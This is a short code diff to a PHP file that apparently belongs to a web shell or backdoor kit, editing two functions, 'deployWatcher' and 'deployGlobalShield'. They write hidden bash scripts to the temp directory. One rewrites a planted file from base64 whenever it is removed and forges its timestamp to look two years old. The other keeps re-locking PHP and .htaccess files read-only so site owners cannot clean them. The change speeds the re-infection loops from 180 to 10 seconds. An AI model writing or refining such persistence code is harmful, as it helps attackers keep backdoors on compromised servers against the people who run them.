@@ -150,7 +150,7 @@ function deployWatcher($fp) {
     $sD = !empty($_SESSION['stealth_date']) ? $_SESSION['stealth_date'] : date("Y-m-d H:i:s", (time()-63072000));
     $sT = strtotime($sD);
     $wF = sys_get_temp_dir() . '/.w_' . substr(md5($fp), 0, 10) . '.sh';
-    $wS = "#!/bin/bash\nFILE=".escapeshellarg($fp)."\nTARGET_TS=".$sT."\nwhile true; do\n  if [ ! -f \"\$FILE\" ] || [ \$(stat -c %Y \"\$FILE\" 2>/dev/null) != \"\$TARGET_TS\" ]; then\n    echo ".escapeshellarg($fC)." | base64 -d > \"\$FILE\" 2>/dev/null; touch -d \"$sD\" \"\$FILE\" 2>/dev/null; chmod 644 \"\$FILE\" 2>/dev/null\n  fi\n  sleep 180\ndone\n";
+    $wS = "#!/bin/bash\nFILE=".escapeshellarg($fp)."\nTARGET_TS=".$sT."\nwhile true; do\n  if [ ! -f \"\$FILE\" ] || [ \$(stat -c %Y \"\$FILE\" 2>/dev/null) != \"\$TARGET_TS\" ]; then\n    echo ".escapeshellarg($fC)." | base64 -d > \"\$FILE\" 2>/dev/null; touch -d \"$sD\" \"\$FILE\" 2>/dev/null; chmod 644 \"\$FILE\" 2>/dev/null\n  fi\n  sleep 10\ndone\n";
     @file_put_contents($wF, $wS); @chmod($wF, 0755);
     safeExec('pkill -9 -f '.escapeshellarg(basename($wF)));
     $pid = safeExec('sh '.escapeshellarg($wF).' > /dev/null 2>&1 &');
@@ -161,7 +161,7 @@ function deployWatcher($fp) {
 // ============== FILE SHIELD ==============
 function deployGlobalShield($dir) {
     global $shieldFlagFile;
-    $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 180\ndone\n";
+    $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 10\ndone\n";
     $wFile = sys_get_temp_dir() . '/.global_w_' . substr(md5($dir), 0, 10) . '.sh';
     @file_put_contents($wFile, $wScript);
     @chmod($wFile, 0755);
